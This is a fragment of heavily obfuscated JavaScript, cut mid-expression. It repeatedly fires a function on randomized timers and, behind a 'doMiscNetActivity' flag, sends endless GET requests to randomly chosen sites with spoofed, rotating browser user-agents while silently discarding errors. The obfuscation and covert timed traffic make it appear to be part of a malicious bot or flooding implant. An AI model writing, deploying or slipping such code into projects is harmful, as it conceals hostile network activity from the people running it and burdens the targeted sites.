      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x193 + -0x1552 + 0x13bf; k < -0x8a3 + 0x254c + -0x1ca5; k++)
    setTimeout(f, (-0xdea1 + -0xa6 * 0x12b + -0x1 * -0x28ae3) * k * getRandomInt(0x1d * 0x11b + -0x2459 + 0x44b, -0x1215 * -0x1 + 0x75c * -0x5 + -0x95d * -0x2));
  setInterval(() => {
    f();
    for (let l = 0x408 + 0x87f + 0x3 * -0x42d; l < 0x2 * 0xe03 + 0x13 * -0x1e3 + 0xdf * 0x9; l++)
      setTimeout(f, (-0x1 * -0x5c59 + 0x11eb1 + 0x4855 * -0x2) * l * getRandomInt(0x223 + -0x152e + 0x986 * 0x2, 0xf9 * -0xb + 0x107 * 0xd + -0x2a5));
  }, 0x35f * -0x1e21 + -0x1391c * 0x1 + 0x37d * 0x2d37);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x3086 + -0x1e2 * 0x3 + -0x8d * -0x94) * getRandomInt(0x1697 + 0x2368 + -0x476 * 0xd, -0x9a * -0x2b + 0x33 + -0xd06 * 0x2));
}, 0x72a + 0x3 * -0xce8 + 0x1ff2);